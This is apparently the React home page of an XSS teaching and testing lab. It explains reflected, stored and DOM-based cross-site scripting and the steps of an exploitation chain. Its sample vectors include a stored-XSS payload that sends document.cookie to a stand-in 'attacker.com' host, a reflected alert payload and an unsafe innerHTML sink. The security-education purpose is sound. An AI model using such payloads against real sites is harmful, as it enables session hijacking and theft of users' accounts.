import Link from "next/link";
import {
  ShieldAlert,
  Terminal,
  BookOpen,
  Zap,
  ArrowRight,
  Flame,
  Layers,
  Lock,
  RefreshCw,
  Server,
  FileCode,
  ShieldCheck,
  AlertTriangle,
  Radio,
  ExternalLink,
} from "lucide-react";

export default function Home() {
  const vulnerabilityTypes = [
    {
      title: "Reflected XSS (Type 1)",
      badge: "Non-Persistent",
      badgeClass: "badge-amber",
      desc: "Payload is carried in a malicious HTTP request (e.g. search query, URL parameters) and reflected directly back by the server into the HTML response without sanitization.",
      vector: "https://victim.com/search?q=<script>alert(1)</script>",
      impact: "Phishing, Session Hijacking, Social Engineering links.",
      link: "/docs#reflected-xss",
      testLink: "/test?tab=reflected",
      icon: RefreshCw,
      accent: "var(--accent-amber)",
    },
    {
      title: "Stored XSS (Type 2)",
      badge: "Persistent / Highest Risk",
      badgeClass: "badge-rose",
      desc: "Payload is permanently saved in a database, message forum, profile bio, or comment section, executing automatically on all subsequent victims who view the page.",
      vector: "<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>",
      impact: "Mass account takeover, Worm propagation (e.g. Samy Worm), Defacement.",
      link: "/docs#stored-xss",
      testLink: "/test?tab=stored",
      icon: Server,
      accent: "var(--accent-rose)",
    },
    {
      title: "DOM-Based XSS (Type 0)",
      badge: "Client-Side Execution",
      badgeClass: "badge-cyan",
      desc: "Vulnerability exists entirely in client-side JavaScript when unsanitized data from a Source (e.g. location.hash) is written into an unsafe Sink (e.g. innerHTML, eval).",
      vector: "element.innerHTML = location.hash.substring(1);",
      impact: "Client-side state manipulation, Token theft, SPA routing hijacking.",
      link: "/docs#dom-xss",
      testLink: "/test?tab=dom",
      icon: FileCode,
      accent: "var(--accent-cyan)",
    },
  ];

  const attackSteps = [
    {
      step: "01",
      title: "Injection Discovery",
      desc: "Attacker identifies unsanitized input vectors (URL parameters, input fields, URI hash, headers).",
      tag: "Source",
    },
    {
      step: "02",
      title: "Context Breaking",
      desc: "Attacker injects characters like \"><script> or onerror= to escape string literals or HTML tags.",
      tag: "Execution Context",
    },
    {
      step: "03",
      title: "Browser Execution",
      desc: "The victim's browser treats the untrusted payload as authentic JavaScript within the application's origin.",
      tag: "Same-Origin Policy",
    },
    {
      step: "04",
      title: "State Exfiltration",
      desc: "The script accesses document.cookie, localStorage, or performs authenticated actions on behalf of the victim.",
      tag: "Impact",
    },
  ];

  return (
    <div>
      {/* Hero Section */}
      <section style={{
        padding: "5rem 0 3.5rem 0",
        position: "relative",
        overflow: "hidden"
      }}>
        <div className="container" style={{ position: "relative", zIndex: 1 }}>
          <div style={{ maxWidth: "860px", margin: "0 auto", textAlign: "center" }}>
            {/* Top pill badge */}
            <div style={{ display: "inline-flex", marginBottom: "1.5rem" }}>
              <div className="badge badge-emerald" style={{ padding: "0.4rem 1rem", fontSize: "0.85rem", gap: "0.5rem" }}>
                <Zap size={15} />
                <span>Interactive Next.js Security Education & Testing Platform</span>
              </div>
            </div>

            {/* Main Headline */}
            <h1 style={{ fontSize: "clamp(2.5rem, 5vw, 3.75rem)", fontWeight: 800, marginBottom: "1.25rem", lineHeight: 1.15 }}>
              Master <span style={{
                background: "linear-gradient(135deg, #10b981, #06b6d4)",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
              }}>Cross-Site Scripting (XSS)</span> & Modern Defenses
            </h1>

            {/* Subtext */}
            <p style={{ fontSize: "1.15rem", color: "var(--text-secondary)", marginBottom: "2.5rem", lineHeight: 1.6 }}>
              Understand how malicious scripts execute inside victim browsers, explore the mechanics of Reflected, Stored, and DOM-based attacks, and learn how to implement foolproof context-aware defenses.
            </p>

            {/* Action Buttons */}
            <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "center", gap: "1rem" }}>
              <Link href="/test" className="btn btn-primary" style={{ padding: "0.85rem 1.75rem", fontSize: "1rem" }}>
                <Terminal size={18} />
                <span>Launch Interactive Lab</span>
                <ArrowRight size={16} />
              </Link>

              <Link href="/docs" className="btn btn-outline" style={{ padding: "0.85rem 1.75rem", fontSize: "1rem" }}>
                <BookOpen size={18} />
                <span>Read Full Documentation</span>
              </Link>
            </div>

            {/* Quick stats / Features bar */}
            <div style={{
              display: "grid",
              gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))",
              gap: "1rem",
              marginTop: "3.5rem",
              padding: "1.25rem",
              background: "rgba(15, 23, 42, 0.5)",
              backdropFilter: "blur(12px)",
              borderRadius: "var(--radius-lg)",
              border: "1px solid var(--border-subtle)"
            }}>
              <div>
                <div style={{ fontSize: "1.5rem", fontWeight: 800, color: "var(--accent-emerald)" }}>3 Core</div>
                <div style={{ fontSize: "0.8rem", color: "var(--text-muted)" }}>XSS Categories Explored</div>
              </div>
              <div>
                <div style={{ fontSize: "1.5rem", fontWeight: 800, color: "var(--accent-cyan)" }}>5 Levels</div>
                <div style={{ fontSize: "0.8rem", color: "var(--text-muted)" }}>Interactive CTF Arena</div>
              </div>
              <div>
                <div style={{ fontSize: "1.5rem", fontWeight: 800, color: "var(--accent-rose)" }}>100% Safe</div>
                <div style={{ fontSize: "0.8rem", color: "var(--text-muted)" }}>Isolated Sandboxed Labs</div>
              </div>
              <div>
                <div style={{ fontSize: "1.5rem", fontWeight: 800, color: "var(--accent-amber)" }}>Defense Guide</div>
                <div style={{ fontSize: "0.8rem", color: "var(--text-muted)" }}>CSP, DOMPurify, Escaping</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* The 3 Core Categories Cards */}
      <section style={{ padding: "3rem 0" }}>
        <div className="container">
          <div style={{ textAlign: "center", marginBottom: "2.5rem" }}>
            <h2 style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>The XSS Vulnerability Triad</h2>
            <p style={{ color: "var(--text-secondary)" }}>
              Every Cross-Site Scripting vulnerability falls into one of three core mechanisms based on data flow and execution path.
            </p>
          </div>

          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))",
            gap: "1.5rem"
          }}>
            {vulnerabilityTypes.map((v) => {
              const Icon = v.icon;
              return (
                <div
                  key={v.title}
                  className="glass-panel"
                  style={{
                    padding: "1.75rem",
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "space-between",
                    position: "relative",
                    overflow: "hidden"
                  }}
                >
                  <div style={{
                    position: "absolute",
                    top: 0,
                    left: 0,
                    right: 0,
                    height: "3px",
                    background: v.accent
                  }} />

                  <div>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "1rem" }}>
                      <div style={{
                        width: "42px",
                        height: "42px",
                        borderRadius: "10px",
                        background: "rgba(255, 255, 255, 0.05)",
                        border: "1px solid var(--border-subtle)",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        color: v.accent
                      }}>
                        <Icon size={22} />
                      </div>
                      <span className={`badge ${v.badgeClass}`}>
                        {v.badge}
                      </span>
                    </div>

                    <h3 style={{ fontSize: "1.25rem", marginBottom: "0.75rem", color: "#fff" }}>
                      {v.title}
                    </h3>
                    <p style={{ fontSize: "0.875rem", color: "var(--text-secondary)", marginBottom: "1.25rem", lineHeight: 1.6 }}>
                      {v.desc}
                    </p>

                    {/* Vector Example Box */}
                    <div style={{
                      background: "rgba(2, 6, 23, 0.8)",
                      border: "1px solid var(--border-subtle)",
                      borderRadius: "var(--radius-md)",
                      padding: "0.75rem",
                      marginBottom: "1rem",
                      fontFamily: "var(--font-mono)",
                      fontSize: "0.75rem",
                      color: v.accent,
                      wordBreak: "break-all"
                    }}>
                      <div style={{ color: "var(--text-muted)", fontSize: "0.7rem", marginBottom: "0.2rem" }}>Sample Vector:</div>
                      {v.vector}
                    </div>

                    <div style={{ fontSize: "0.8rem", color: "var(--text-muted)", marginBottom: "1.5rem" }}>
                      <strong style={{ color: "#fff" }}>Primary Impact:</strong> {v.impact}
                    </div>
                  </div>

                  {/* Card Action Buttons */}
                  <div style={{ display: "flex", gap: "0.75rem", paddingTop: "1rem", borderTop: "1px solid var(--border-subtle)" }}>
                    <Link href={v.testLink} className="btn btn-primary btn-sm" style={{ flex: 1 }}>
                      <Terminal size={14} />
                      <span>Test in Lab</span>
                    </Link>
                    <Link href={v.link} className="btn btn-outline btn-sm">
                      <BookOpen size={14} />
                      <span>Learn More</span>
                    </Link>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* Anatomy of an Attack Workflow */}
      <section style={{ padding: "3rem 0" }}>
        <div className="container">
          <div className="glass-panel" style={{ padding: "2.5rem" }}>
            <div style={{ textAlign: "center", maxWidth: "650px", margin: "0 auto 2.5rem auto" }}>
              <div className="badge badge-rose" style={{ marginBottom: "0.75rem" }}>
                Attack Lifecycle
              </div>
              <h2 style={{ fontSize: "1.85rem", marginBottom: "0.5rem" }}>Anatomy of an XSS Exploitation Chain</h2>
              <p style={{ color: "var(--text-secondary)", fontSize: "0.9rem" }}>
                How an unescaped string transforms into an authenticated arbitrary script execution.
              </p>
            </div>

            <div style={{
              display: "grid",
              gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
              gap: "1.5rem",
              position: "relative"
            }}>
              {attackSteps.map((s) => (
                <div
                  key={s.step}
                  style={{
                    background: "rgba(2, 6, 23, 0.6)",
                    border: "1px solid var(--border-subtle)",
                    borderRadius: "var(--radius-md)",
                    padding: "1.5rem",
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "space-between"
                  }}
                >
                  <div>
                    <div style={{
                      fontSize: "2rem",
                      fontWeight: 800,
                      fontFamily: "var(--font-heading)",
                      color: "rgba(255, 255, 255, 0.15)",
                      marginBottom: "0.5rem"
                    }}>
                      {s.step}
                    </div>
                    <span className="badge badge-cyan" style={{ fontSize: "0.68rem", marginBottom: "0.6rem" }}>
                      {s.tag}
                    </span>
                    <h4 style={{ fontSize: "1.05rem", color: "#fff", marginBottom: "0.5rem" }}>{s.title}</h4>
                    <p style={{ fontSize: "0.82rem", color: "var(--text-secondary)", lineHeight: 1.5 }}>
                      {s.desc}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* Call to Action Banner */}
      <section style={{ padding: "2rem 0 4rem 0" }}>
        <div className="container">
          <div style={{
            background: "linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(6, 182, 212, 0.15))",
            border: "1px solid rgba(16, 185, 129, 0.3)",
            borderRadius: "var(--radius-lg)",
            padding: "3rem 2rem",
            display: "flex",
            flexWrap: "wrap",
            alignItems: "center",
            justifyContent: "space-between",
            gap: "2rem"
          }}>
            <div style={{ maxWidth: "600px" }}>
              <h3 style={{ fontSize: "1.75rem", marginBottom: "0.5rem", color: "#fff" }}>
                Ready to test payloads & see defenses in action?
              </h3>
              <p style={{ color: "var(--text-secondary)", fontSize: "0.95rem" }}>
                Jump into the Interactive Lab to experiment with live Reflected, Stored, and DOM-based sandboxes, bypass weak filters, and solve the 5 CTF challenges.
              </p>
            </div>

            <div style={{ display: "flex", gap: "1rem", flexWrap: "wrap" }}>
              <Link href="/test" className="btn btn-primary" style={{ padding: "0.85rem 1.5rem" }}>
                <Terminal size={18} />
                <span>Go to Vulnerability Lab</span>
              </Link>
              <Link href="/docs" className="btn btn-outline" style={{ padding: "0.85rem 1.5rem" }}>
                <BookOpen size={18} />
                <span>View Documentation</span>
              </Link>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}
